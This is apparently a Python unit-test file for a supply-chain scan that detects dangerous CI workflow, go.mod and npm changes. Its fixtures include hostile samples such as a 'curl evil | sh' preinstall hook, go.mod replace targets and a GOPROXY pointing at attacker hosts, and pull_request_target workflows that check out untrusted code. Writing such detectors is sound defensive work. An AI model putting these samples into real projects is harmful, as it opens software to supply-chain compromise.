#!/usr/bin/env python3
"""Unit tests for the supply-chain scan.

Run from this directory:
    python3 -m unittest scan_test
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path

import scan
import signals


def _fc(
    path: str,
    *,
    base: str | None = None,
    head: str | None = None,
    added: list[tuple[int, str]] | None = None,
) -> signals.FileChange:
    """Quick FileChange builder for signal unit tests."""
    return signals.FileChange(
        path=path,
        base_content=base,
        head_content=head,
        added_lines=added or [],
    )


# ---------------------------------------------------------------------------
# Signal-level unit tests (no git needed — exercise pure logic)
# ---------------------------------------------------------------------------


class WorkflowTrustSignalTest(unittest.TestCase):
    def test_pull_request_target_with_head_sha_ref_blocks(self) -> None:
        wf = textwrap.dedent(
            """
            name: bad
            on:
              pull_request_target:
            jobs:
              x:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertIn("TanStack", findings[0].message)

    def test_pull_request_target_with_head_ref_blocks(self) -> None:
        wf = textwrap.dedent(
            """
            on:
              pull_request_target:
            jobs:
              x:
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.ref }}
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_pull_request_target_with_refs_pull_merge_blocks(self) -> None:
        wf = textwrap.dedent(
            """
            on: pull_request_target
            jobs:
              x:
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: refs/pull/${{ github.event.number }}/merge
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_safe_pull_request_target_no_checkout_does_not_block(self) -> None:
        """Mirrors the existing greptile-policy-gate.yml posture: pull_request_target,
        no PR-head checkout, only API calls. Must NOT trigger."""
        wf = textwrap.dedent(
            """
            on:
              pull_request_target:
            permissions:
              checks: read
              pull-requests: write
            jobs:
              gate:
                runs-on: ubuntu-latest
                steps:
                  - run: gh api repos/${{ github.repository }}/pulls/${{ github.event.pull_request.number }}
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/policy.yml", head=wf))
        self.assertEqual(findings, [])

    def test_pull_request_target_with_safe_checkout_does_not_block(self) -> None:
        """pull_request_target + actions/checkout but no `ref:` override (defaults
        to base SHA) is safe."""
        wf = textwrap.dedent(
            """
            on:
              pull_request_target:
            jobs:
              x:
                steps:
                  - uses: actions/checkout@v4
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/ok.yml", head=wf))
        self.assertEqual(findings, [])

    def test_plain_pull_request_with_head_ref_does_not_block(self) -> None:
        """pull_request (not _target) + head ref is fine — no elevated context."""
        wf = textwrap.dedent(
            """
            on:
              pull_request:
            jobs:
              x:
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/ci.yml", head=wf))
        self.assertEqual(findings, [])

    def test_flow_sequence_trigger_with_head_sha_blocks(self) -> None:
        """Greptile-flagged evasion: compact YAML flow-sequence trigger form
        `on: [pull_request_target, push]` must still be detected."""
        wf = textwrap.dedent(
            """
            on: [pull_request_target, push]
            jobs:
              x:
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
            """
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_flow_sequence_trigger_other_order_blocks(self) -> None:
        wf = "on: [push, pull_request_target]\njobs:\n  x:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_preexisting_dangerous_ref_unchanged_does_not_fire(self) -> None:
        """Diff-awareness: a dangerous ref that pre-existed on base and was
        not modified by this PR must NOT trip R1. Forward-looking guard
        against false positives if main ever drifts to contain a flagged
        pattern."""
        wf = "on:\n  pull_request_target:\njobs:\n  x:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
        # base_content non-None (existing file) + no added_lines → no findings
        change = _fc(".github/workflows/legacy.yml", base=wf, head=wf, added=[])
        findings = signals.signal_workflow_trust(change)
        self.assertEqual(findings, [])

    def test_dangerous_ref_added_to_existing_workflow_blocks(self) -> None:
        """Diff-aware fire: the dangerous ref appears in added_lines on an
        already-existing workflow. Must still flag."""
        base = "on:\n  pull_request_target:\njobs:\n  x:\n    steps:\n      - uses: actions/checkout@v4\n"
        head = base + "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
        change = _fc(
            ".github/workflows/legacy.yml",
            base=base,
            head=head,
            added=[(8, "        with:"), (9, "          ref: ${{ github.event.pull_request.head.sha }}")],
        )
        findings = signals.signal_workflow_trust(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_block_scalar_folded_ref_blocks(self) -> None:
        """Greptile-flagged bypass: YAML folded block-scalar `ref: >-` with
        the dangerous expression on the next line evades single-line regex
        but is semantically identical. Structural YAML parsing catches it."""
        wf = (
            "on:\n  pull_request_target:\n"
            "jobs:\n  x:\n    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n"
            "          ref: >-\n"
            "            ${{ github.event.pull_request.head.sha }}\n"
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_block_scalar_literal_ref_blocks(self) -> None:
        """Literal block-scalar form `|-` same as folded — must also block."""
        wf = (
            "on:\n  pull_request_target:\n"
            "jobs:\n  x:\n    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n"
            "          ref: |-\n"
            "            refs/pull/123/merge\n"
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_github_head_ref_shorthand_blocks(self) -> None:
        """Greptile-flagged: github.head_ref is the shorthand alias for
        event.pull_request.head.ref and resolves to PR-author-controlled
        content under pull_request_target. Must block."""
        wf = (
            "on:\n  pull_request_target:\n"
            "jobs:\n  x:\n    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n"
            "          ref: ${{ github.head_ref }}\n"
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_merge_commit_sha_blocks(self) -> None:
        """github.event.pull_request.merge_commit_sha points at GitHub's
        test-merge commit — contains PR-author code merged with base, same
        elevated-context risk under pull_request_target."""
        wf = (
            "on:\n  pull_request_target:\n"
            "jobs:\n  x:\n    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n"
            "          ref: ${{ github.event.pull_request.merge_commit_sha }}\n"
        )
        findings = signals.signal_workflow_trust(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_write_all_permissions_blocks(self) -> None:
        """Newly-covered case: `permissions: write-all` grants id-token implicitly.
        Also assert the finding's line annotation points somewhere — the
        original needle was the literal "id-token" string, which doesn't appear
        in a write-all-only workflow, so line silently came out as None."""
        wf = "permissions: write-all\n"
        findings = signals.signal_id_token_outside_allowlist(
            _fc(".github/workflows/bad.yml", head=wf)
        )
        self.assertEqual(len(findings), 1)
        self.assertIsNotNone(findings[0].line)

    def test_job_level_write_all_blocks_with_line(self) -> None:
        """Greptile-flagged: job-level `permissions: write-all` also implies
        id-token. The previous needle-selection only inspected workflow-level
        permissions, leaving job-level write-all with line=None even though
        _walk_id_token_grants detected it."""
        wf = (
            "name: bad\n"
            "on: push\n"
            "jobs:\n"
            "  x:\n"
            "    runs-on: ubuntu-latest\n"
            "    permissions: write-all\n"
            "    steps:\n"
            "      - run: echo hi\n"
        )
        findings = signals.signal_id_token_outside_allowlist(
            _fc(".github/workflows/bad.yml", head=wf)
        )
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertIsNotNone(findings[0].line)


class IdTokenSignalTest(unittest.TestCase):
    def test_id_token_in_non_publish_workflow_blocks(self) -> None:
        wf = "permissions:\n  id-token: write\n  contents: read\n"
        findings = signals.signal_id_token_outside_allowlist(
            _fc(".github/workflows/verify-skills.yml", head=wf)
        )
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_id_token_in_npm_publish_does_not_block(self) -> None:
        wf = "permissions:\n  id-token: write\n  contents: read\n"
        findings = signals.signal_id_token_outside_allowlist(
            _fc(".github/workflows/npm-publish.yml", head=wf)
        )
        self.assertEqual(findings, [])

    def test_no_id_token_does_not_block(self) -> None:
        wf = "permissions:\n  contents: read\n"
        findings = signals.signal_id_token_outside_allowlist(
            _fc(".github/workflows/anything.yml", head=wf)
        )
        self.assertEqual(findings, [])

    def test_preexisting_id_token_unchanged_does_not_fire(self) -> None:
        """Diff-awareness: existing id-token grant on base (e.g., if main ever
        adds another publishing workflow) must not be re-flagged on unrelated PRs."""
        wf = "permissions:\n  id-token: write\n  contents: read\n"
        change = _fc(".github/workflows/some-publish.yml", base=wf, head=wf, added=[])
        findings = signals.signal_id_token_outside_allowlist(change)
        self.assertEqual(findings, [])

    def test_id_token_added_to_existing_workflow_blocks(self) -> None:
        """Diff-aware fire: id-token: write added to a workflow that didn't have it before."""
        base = "permissions:\n  contents: read\n"
        head = "permissions:\n  id-token: write\n  contents: read\n"
        change = _fc(
            ".github/workflows/build.yml",
            base=base,
            head=head,
            added=[(2, "  id-token: write")],
        )
        findings = signals.signal_id_token_outside_allowlist(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_id_token_with_trailing_comment_blocks(self) -> None:
        """Greptile-flagged edge case: `id-token: write  # justification` would
        evade the strict end-of-line regex. Now allowed via optional trailing
        comment in the regex."""
        wf = "permissions:\n  id-token: write  # i promise this is fine\n"
        findings = signals.signal_id_token_outside_allowlist(
            _fc(".github/workflows/sneaky.yml", head=wf)
        )
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())


class GomodReplaceSignalTest(unittest.TestCase):
    def test_replace_to_github_blocks(self) -> None:
        change = _fc(
            "library/payments/kalshi/go.mod",
            head="module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n\nreplace example.com/foo => github.com/attacker/fork v0.0.1\n",
            added=[(3, "replace example.com/foo => github.com/attacker/fork v0.0.1")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertEqual(findings[0].signal_id, "gomod_replace_remote_target")

    def test_replace_to_https_url_blocks(self) -> None:
        change = _fc(
            "library/payments/kalshi/go.mod",
            head="...",
            added=[(3, "replace foo => https://evil.example/foo v1.0.0")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_replace_to_local_path_advises_only(self) -> None:
        change = _fc(
            "library/food-and-dining/foo/go.mod",
            head="...",
            added=[(3, "replace github.com/ledongthuc/pdf => ./third_party/stubs/pdf")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 1)
        self.assertFalse(findings[0].is_block())
        self.assertEqual(findings[0].severity, "advise")
        self.assertEqual(findings[0].signal_id, "gomod_replace_local_target")

    def test_replace_to_parent_path_advises_only(self) -> None:
        change = _fc(
            "library/foo/bar/go.mod",
            head="...",
            added=[(3, "replace foo => ../../vendor/foo")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "advise")

    def test_no_new_replace_does_not_fire(self) -> None:
        """The diff has no added lines (e.g., reprint regenerates identical content) →
        existing replace directives in head_content are not re-flagged."""
        change = _fc(
            "library/food-and-dining/ordertogo/go.mod",
            head="module github.com/mvanhorn/printing-press-library/library/food-and-dining/ordertogo\n\nreplace github.com/browserutils/kooky => ./third_party/kooky\n",
            added=[],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(findings, [])

    def test_replace_outside_library_does_not_fire(self) -> None:
        change = _fc(
            "tools/generate-registry/go.mod",
            head="...",
            added=[(3, "replace foo => github.com/attacker/fork v1.0.0")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(findings, [])

    def test_block_form_replace_to_github_blocks(self) -> None:
        """Greptile-flagged evasion case: block-form `replace ( ... )` body lines
        have no leading `replace` keyword. Must still trip the BufferZoneCorp gate."""
        head = (
            "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n"
            "\n"
            "go 1.26.5\n"
            "\n"
            "replace (\n"
            "    example.com/foo => github.com/attacker/fork v0.0.1\n"
            ")\n"
        )
        change = _fc(
            "library/payments/kalshi/go.mod",
            head=head,
            added=[(6, "    example.com/foo => github.com/attacker/fork v0.0.1")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertEqual(findings[0].signal_id, "gomod_replace_remote_target")

    def test_block_form_replace_to_local_advises(self) -> None:
        head = (
            "module github.com/mvanhorn/printing-press-library/library/food-and-dining/foo\n"
            "\n"
            "go 1.26.5\n"
            "\n"
            "replace (\n"
            "    github.com/ledongthuc/pdf => ./third_party/stubs/pdf\n"
            ")\n"
        )
        change = _fc(
            "library/food-and-dining/foo/go.mod",
            head=head,
            added=[(6, "    github.com/ledongthuc/pdf => ./third_party/stubs/pdf")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "advise")

    def test_block_form_multiple_entries_all_flagged(self) -> None:
        head = (
            "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n"
            "\n"
            "go 1.26.5\n"
            "\n"
            "replace (\n"
            "    example.com/foo => github.com/attacker/fork v0.0.1\n"
            "    example.com/bar => github.com/other/fork v0.0.1\n"
            "    example.com/baz => ./vendor/baz\n"
            ")\n"
        )
        change = _fc(
            "library/payments/kalshi/go.mod",
            head=head,
            added=[
                (6, "    example.com/foo => github.com/attacker/fork v0.0.1"),
                (7, "    example.com/bar => github.com/other/fork v0.0.1"),
                (8, "    example.com/baz => ./vendor/baz"),
            ],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(len(findings), 3)
        # First two are remote-target → block.
        self.assertTrue(findings[0].is_block())
        self.assertTrue(findings[1].is_block())
        # Third is local-path → advise.
        self.assertEqual(findings[2].severity, "advise")

    def test_arrow_outside_block_does_not_false_positive(self) -> None:
        """A line containing `=>` that isn't inside a replace block (e.g., a
        comment, a require directive's // indirect annotation, or a stray line)
        must NOT trip the rule."""
        head = (
            "module github.com/mvanhorn/printing-press-library/library/x/y\n"
            "\n"
            "// some comment that mentions => arrow\n"
            "require example.com/foo v1.0.0 // indirect\n"
        )
        change = _fc(
            "library/x/y/go.mod",
            head=head,
            added=[(3, "// some comment that mentions => arrow")],
        )
        findings = signals.signal_gomod_replace(change)
        self.assertEqual(findings, [])


class GoEnvOverrideSignalTest(unittest.TestCase):
    def test_goproxy_in_workflow_blocks(self) -> None:
        wf = "jobs:\n  x:\n    env:\n      GOPROXY: https://mirror.attacker.example\n"
        findings = signals.signal_go_env_override(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_goflags_blocks(self) -> None:
        wf = "env:\n  GOFLAGS: -insecure\n"
        findings = signals.signal_go_env_override(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_gonosumcheck_blocks(self) -> None:
        wf = "env:\n  GONOSUMCHECK: '*'\n"
        findings = signals.signal_go_env_override(_fc(".github/workflows/bad.yml", head=wf))
        self.assertEqual(len(findings), 1)

    def test_unrelated_env_does_not_fire(self) -> None:
        wf = "env:\n  GO_VERSION: 1.22\n  CGO_ENABLED: 0\n"
        findings = signals.signal_go_env_override(_fc(".github/workflows/ok.yml", head=wf))
        self.assertEqual(findings, [])

    def test_preexisting_goproxy_unchanged_does_not_fire(self) -> None:
        """Diff-awareness: pre-existing GOPROXY on base shouldn't re-fire if
        the diff doesn't touch it."""
        wf = "env:\n  GOPROXY: https://corp.example/\n"
        change = _fc(".github/workflows/legacy.yml", base=wf, head=wf, added=[])
        findings = signals.signal_go_env_override(change)
        self.assertEqual(findings, [])

    def test_goproxy_added_blocks(self) -> None:
        base = "jobs:\n  x:\n    runs-on: ubuntu-latest\n"
        head = "jobs:\n  x:\n    runs-on: ubuntu-latest\n    env:\n      GOPROXY: https://mirror.attacker.example\n"
        change = _fc(
            ".github/workflows/build.yml",
            base=base,
            head=head,
            added=[(4, "    env:"), (5, "      GOPROXY: https://mirror.attacker.example")],
        )
        findings = signals.signal_go_env_override(change)
        self.assertEqual(len(findings), 1)


class SetupGoVersionSignalTest(unittest.TestCase):
    def test_new_hardcoded_setup_go_version_blocks(self) -> None:
        base = "jobs:\n  x:\n    steps:\n      - uses: actions/checkout@v6\n"
        head = textwrap.dedent(
            """
            jobs:
              x:
                steps:
                  - uses: actions/setup-go@v6
                    with:
                      go-version: '1.26.5'
            """
        )
        findings = signals.signal_setup_go_uses_go_version_file(
            _fc(".github/workflows/build.yml", base=base, head=head)
        )
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertEqual(findings[0].signal_id, "setup_go_hardcoded_version")

    def test_unquoted_two_segment_setup_go_version_blocks(self) -> None:
        head = textwrap.dedent(
            """
            jobs:
              x:
                steps:
                  - uses: actions/setup-go@v6
                    with:
                      go-version: 1.22
            """
        )
        findings = signals.signal_setup_go_uses_go_version_file(
            _fc(".github/workflows/build.yml", head=head)
        )
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_go_version_file_does_not_block(self) -> None:
        head = textwrap.dedent(
            """
            jobs:
              x:
                steps:
                  - uses: actions/setup-go@v6
                    with:
                      go-version-file: .go-version
            """
        )
        findings = signals.signal_setup_go_uses_go_version_file(
            _fc(".github/workflows/build.yml", head=head)
        )
        self.assertEqual(findings, [])

    def test_preexisting_literal_unchanged_does_not_re_fire(self) -> None:
        wf = textwrap.dedent(
            """
            jobs:
              x:
                steps:
                  - uses: actions/setup-go@v6
                    with:
                      go-version: '1.26.5'
            """
        )
        findings = signals.signal_setup_go_uses_go_version_file(
            _fc(".github/workflows/legacy.yml", base=wf, head=wf)
        )
        self.assertEqual(findings, [])


class LibraryGoFloorSignalTest(unittest.TestCase):
    def test_go_directive_below_floor_blocks(self) -> None:
        gomod = (
            "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n"
            "\ngo 1.26.4\n"
        )
        findings = signals.signal_library_go_floor(
            _fc("library/payments/kalshi/go.mod", head=gomod)
        )
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertEqual(findings[0].signal_id, "library_go_directive_below_floor")

    def test_go_directive_at_floor_does_not_block(self) -> None:
        gomod = (
            "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n"
            "\ngo 1.26.5\n"
        )
        findings = signals.signal_library_go_floor(
            _fc("library/payments/kalshi/go.mod", head=gomod)
        )
        self.assertEqual(findings, [])

    def test_go_directive_uses_scanned_head_floor(self) -> None:
        gomod = (
            "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n"
            "\ngo 1.26.5\n"
        )
        findings = signals.signal_library_go_floor(
            signals.FileChange(
                path="library/payments/kalshi/go.mod",
                base_content=None,
                head_content=gomod,
                added_lines=[],
                go_floor="1.26.6",
            )
        )
        self.assertEqual(len(findings), 1)


class NpmLifecycleSignalTest(unittest.TestCase):
    def test_postinstall_added_blocks(self) -> None:
        base = json.dumps({"name": "x", "scripts": {"build": "tsc"}})
        head = json.dumps({"name": "x", "scripts": {"build": "tsc", "postinstall": "node ./mal.js"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("npm/package.json", base=base, head=head)
        )
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())

    def test_existing_prepublishonly_not_flagged(self) -> None:
        """prepublishOnly is allowed (CI-only). Not in the watched set."""
        base = json.dumps({"name": "x", "scripts": {"prepublishOnly": "npm test"}})
        head = json.dumps({"name": "x", "scripts": {"prepublishOnly": "npm test && npm run build"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("npm/package.json", base=base, head=head)
        )
        self.assertEqual(findings, [])

    def test_existing_postinstall_not_re_flagged(self) -> None:
        """If a postinstall already existed on base (it doesn't here, but hypothetically),
        modifying it should not fire — we only flag *added* lifecycle scripts."""
        base = json.dumps({"scripts": {"postinstall": "node a.js"}})
        head = json.dumps({"scripts": {"postinstall": "node b.js"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("npm/package.json", base=base, head=head)
        )
        self.assertEqual(findings, [])

    def test_preinstall_added_blocks(self) -> None:
        base = json.dumps({"scripts": {}})
        head = json.dumps({"scripts": {"preinstall": "curl evil | sh"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("npm/package.json", base=base, head=head)
        )
        self.assertEqual(len(findings), 1)

    def test_prepare_added_blocks(self) -> None:
        base = json.dumps({"scripts": {}})
        head = json.dumps({"scripts": {"prepare": "node ./build.js"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("npm/package.json", base=base, head=head)
        )
        self.assertEqual(len(findings), 1)

    def test_outside_npm_package_json_does_not_fire(self) -> None:
        head = json.dumps({"scripts": {"postinstall": "node ./mal.js"}})
        findings = signals.signal_npm_lifecycle_script(
            _fc("library/x/foo/promo/package.json", head=head)
        )
        self.assertEqual(findings, [])


class ModulePathDriftSignalTest(unittest.TestCase):
    PREFIX = "github.com/mvanhorn/printing-press-library/library/"

    def test_drift_to_attacker_path_blocks(self) -> None:
        base = f"module {self.PREFIX}payments/kalshi\n\ngo 1.26.5\n"
        head = "module github.com/attacker/kalshi-fork\n\ngo 1.26.5\n"
        change = _fc("library/payments/kalshi/go.mod", base=base, head=head)
        findings = signals.signal_module_path_drift(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertEqual(findings[0].signal_id, "module_path_drift_on_existing_cli")

    def test_canonical_path_unchanged_does_not_fire(self) -> None:
        same = f"module {self.PREFIX}payments/kalshi\n\ngo 1.26.5\n"
        change = _fc("library/payments/kalshi/go.mod", base=same, head=same)
        findings = signals.signal_module_path_drift(change)
        self.assertEqual(findings, [])

    def test_new_cli_with_canonical_path_does_not_fire(self) -> None:
        head = f"module {self.PREFIX}other/freshly-minted\n\ngo 1.26.5\n"
        change = _fc("library/other/freshly-minted/go.mod", base=None, head=head)
        findings = signals.signal_module_path_drift(change)
        self.assertEqual(findings, [])

    def test_new_cli_with_non_canonical_path_blocks(self) -> None:
        head = "module github.com/someone-else/whatever\n\ngo 1.26.5\n"
        change = _fc("library/other/freshly-minted/go.mod", base=None, head=head)
        findings = signals.signal_module_path_drift(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertEqual(findings[0].signal_id, "module_path_noncanonical_on_new_cli")

    def test_within_canonical_rename_blocks(self) -> None:
        """Greptile-flagged: a rename that keeps the canonical prefix
        (e.g., kalshi → kalshi-evil, both under github.com/.../library/) still
        redirects `go install` for users pinned to the old slug. Must block."""
        base = f"module {self.PREFIX}payments/kalshi\n\ngo 1.26.5\n"
        head = f"module {self.PREFIX}payments/kalshi-evil\n\ngo 1.26.5\n"
        # build_change in scan.py sets base_content from the OLD path on a
        # rename; here we simulate that by populating base_content directly.
        change = _fc("library/payments/kalshi-evil/go.mod", base=base, head=head)
        findings = signals.signal_module_path_drift(change)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].is_block())
        self.assertEqual(findings[0].signal_id, "module_path_rename_on_existing_cli")


# ---------------------------------------------------------------------------
# Integration test: real git repo, end-to-end scan invocation
# ---------------------------------------------------------------------------


class ScanIntegrationTest(unittest.TestCase):
    """Exercise scan.main() against real git diffs in a tempdir repo.

    This is the most expensive layer of testing but catches integration bugs
    that signal-level unit tests can't (git-show invocation, diff parsing,
    annotation emission, exit codes).
    """

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="verify-supply-chain-"))
        self.addCleanup(lambda: shutil.rmtree(self.tmp))
        self.old_root = scan.REPO_ROOT
        scan.REPO_ROOT = self.tmp
        self._git("init", "-q", "-b", "main")
        self._git("config", "user.email", "test@example.com")
        self._git("config", "user.name", "Test")
        self._git("commit", "--allow-empty", "-q", "-m", "init")

    def tearDown(self) -> None:
        scan.REPO_ROOT = self.old_root

    def _git(self, *args: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            ["git", *args],
            cwd=self.tmp,
            check=True,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

    def _write(self, rel: str, content: str) -> None:
        p = self.tmp / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)

    def _commit(self, message: str) -> None:
        self._git("add", "-A")
        self._git("commit", "-q", "--allow-empty", "-m", message)

    def _run_scan(self, base: str = "main", head: str = "HEAD", strict: bool = False) -> int:
        argv = ["--base-ref", base, "--head-ref", head]
        if strict:
            argv.append("--strict")
        return scan.main(argv)

    # -------- Happy paths --------

    def test_clean_pr_no_findings(self) -> None:
        """Bug fix to a CLI's internal/cli/ — no scoped files touched → exit 0."""
        self._write("library/payments/kalshi/internal/cli/root.go", "package cli\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write("library/payments/kalshi/internal/cli/root.go", "package cli\n// edit\n")
        self._commit("tweak")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    # -------- Block-tier shapes --------

    def test_pr_target_with_head_checkout_fails(self) -> None:
        self._write(".github/workflows/existing.yml", "on: push\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            ".github/workflows/new.yml",
            "on:\n  pull_request_target:\njobs:\n  x:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n",
        )
        self._commit("add bad workflow")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_id_token_in_non_publish_workflow_fails(self) -> None:
        self._write(".github/workflows/baseline.yml", "on: push\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            ".github/workflows/baseline.yml",
            "on: push\npermissions:\n  id-token: write\n",
        )
        self._commit("grant id-token")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_id_token_in_npm_publish_allowed(self) -> None:
        self._write(".github/workflows/npm-publish.yml", "on: push\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            ".github/workflows/npm-publish.yml",
            "on: push\npermissions:\n  id-token: write\n",
        )
        self._commit("legitimate publishing OIDC")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    def test_replace_to_github_in_library_gomod_fails(self) -> None:
        gomod = "module github.com/mvanhorn/printing-press-library/library/payments/kalshi\n\ngo 1.26.5\n"
        self._write("library/payments/kalshi/go.mod", gomod)
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            "library/payments/kalshi/go.mod",
            gomod + "\nreplace example.com/foo => github.com/attacker/fork v0.0.1\n",
        )
        self._commit("add malicious replace")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

    def test_replace_to_local_path_advises_but_does_not_fail(self) -> None:
        gomod = "module github.com/mvanhorn/printing-press-library/library/food-and-dining/foo\n\ngo 1.26.5\n"
        self._write("library/food-and-dining/foo/go.mod", gomod)
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            "library/food-and-dining/foo/go.mod",
            gomod + "\nreplace github.com/ledongthuc/pdf => ./third_party/stubs/pdf\n",
        )
        self._commit("vendor a fork locally")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    def test_existing_replace_directives_not_re_flagged(self) -> None:
        """Regression guard: the existing ordertogo CLI's three replace directives
        must NOT trip the scan when the PR doesn't touch that go.mod."""
        gomod = (
            "module github.com/mvanhorn/printing-press-library/library/food-and-dining/ordertogo\n"
            "\ngo 1.26.5\n"
            "replace github.com/browserutils/kooky => ./third_party/kooky\n"
            "replace github.com/ledongthuc/pdf => ./third_party/stubs/pdf\n"
            "replace github.com/orisano/pixelmatch => ./third_party/stubs/pixelmatch\n"
        )
        self._write("library/food-and-dining/ordertogo/go.mod", gomod)
        self._write("library/food-and-dining/ordertogo/internal/cli/root.go", "package cli\n")
        self._commit("baseline with existing replaces")
        self._git("checkout", "-q", "-b", "feat/x")
        # Touch ONLY internal Go source, not go.mod.
        self._write(
            "library/food-and-dining/ordertogo/internal/cli/root.go",
            "package cli\n// edit\n",
        )
        self._commit("unrelated edit")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 0)

    def test_goproxy_in_workflow_env_fails(self) -> None:
        self._write(".github/workflows/baseline.yml", "on: push\n")
        self._commit("baseline")
        self._git("checkout", "-q", "-b", "feat/x")
        self._write(
            ".github/workflows/baseline.yml",
            "on: push\njobs:\n  x:\n    env:\n      GOPROXY: https://mirror.attacker.example\n",
        )
        self._commit("redirect GOPROXY")
        rc = self._run_scan(base="main")
        self.assertEqual(rc, 1)

